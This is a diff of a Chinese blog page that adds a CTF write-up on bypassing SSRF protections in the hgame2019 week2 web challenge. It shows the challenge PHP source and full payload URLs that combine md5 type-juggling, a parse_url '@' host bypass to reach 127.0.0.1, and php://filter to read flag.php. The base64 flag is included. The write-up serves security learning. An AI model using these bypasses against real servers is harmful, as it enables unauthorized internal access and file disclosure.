@@ -86,15 +86,21 @@
 
 
 
+<meta name="description" content="以hgame2019-week2的web为例 题目源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET[&apos;str1&apos;];$str2 =">
 <meta name="keywords" content="系统总结">
 <meta property="og:type" content="article">
 <meta property="og:title" content="浅谈ssrf绕过">
 <meta property="og:url" content="https://yml-sec.top/2019/02/08/浅谈ssrf绕过/index.html">
 <meta property="og:site_name" content="yemoli&#39;s blog">
+<meta property="og:description" content="以hgame2019-week2的web为例 题目源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET[&apos;str1&apos;];$str2 =">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-02-08T10:09:35.952Z">
+<meta property="og:image" content="https://i.imgur.com/wmpZo9i.jpg">
+<meta property="og:image" content="https://i.imgur.com/dPux374.jpg">
+<meta property="og:updated_time" content="2019-02-10T09:12:45.154Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅谈ssrf绕过">
+<meta name="twitter:description" content="以hgame2019-week2的web为例 题目源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET[&apos;str1&apos;];$str2 =">
+<meta name="twitter:image" content="https://i.imgur.com/wmpZo9i.jpg">
 
 
 
@@ -317,7 +323,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  0
+                  507
                 </span>
               
 
@@ -333,7 +339,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  1
+                  2
                 </span>
               
             </div>
@@ -354,7 +360,31 @@
       
 
       
-        
+        <p>以hgame2019-week2的web为例</p>
+<p>题目源码</p>
+<pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//admin.php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    die(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    die(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    die(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    die(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==false) &#123;</span><br><span class="line">    die(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    die(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    die(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    die(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    die(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    die(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === FALSE)&#123;</span><br><span class="line">    die(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    echo $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</code></pre><p>题目提示admin.php，访问一下</p>
+<p><img src="https://i.imgur.com/wmpZo9i.jpg" alt=""></p>
+<p>让人联想到ssrf</p>
+<p>前面的几个if都是正常绕过</p>
+<pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">	    die(<span class="string">'step 9 fail'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">	    die(<span class="string">'step 10 fail'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$ch = curl_init();</span><br><span class="line">	curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">	$output = curl_exec($ch);</span><br><span class="line">	curl_close($ch);</span><br><span class="line">	<span class="keyword">if</span>($output === FALSE)&#123;</span><br><span class="line">	    die(<span class="string">'step 11 fail'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	    echo $output;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+</code></pre><p>这里涉及了parse_url函数的绕过，我们既要访问到本地的admin.php又要保证URL符合<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
+<p>找到了这篇文章<a href="https://www.cnblogs.com/afanti/p/9928371.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/9928371.html</a></p>
+<p>这里可用@进行绕过</p>
+<pre><code>http://@127.0.0.1:80@www.baidu.com/admin.php
+</code></pre><p>可以使其访问到admin.php</p>
+<p>payload:</p>
+<pre><code>http://118.24.3.214:3001/index.php?str1=s878926199a&amp;str2=s155964671a&amp;str3[]=1&amp;str4[]=2%00&amp;H+game[]=999&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php
+</code></pre><p>得到了admin的源码</p>
+<pre><code><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag.php</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    die(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET['filename']??'';</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    echo <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    echo file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</code></pre><p>这里源码的意思是这个文件不存在但是还是让我们读取，在这里可以使用php://filter伪协议</p>
+<p>最后payload:</p>
+<pre><code>http://118.24.3.214:3001/index.php?str1=s878926199a&amp;str2=s155964671a&amp;str3[]=1&amp;str4[]=2%00&amp;H+game[]=999&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre><p>得到一串base64编码</p>
+<pre><code>PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA/Pgo= 
+</code></pre><p>解密后得到flag</p>
+<p><img src="https://i.imgur.com/dPux374.jpg" alt=""></p>
+
       
     </div>
     
@@ -591,7 +621,7 @@
 
 <div class="theme-info">
  <div class="powered-by"></div>
- <span class="post-count">博客全站共17.6k字</span>
+ <span class="post-count">博客全站共18.1k字</span>
 </div>
         
 
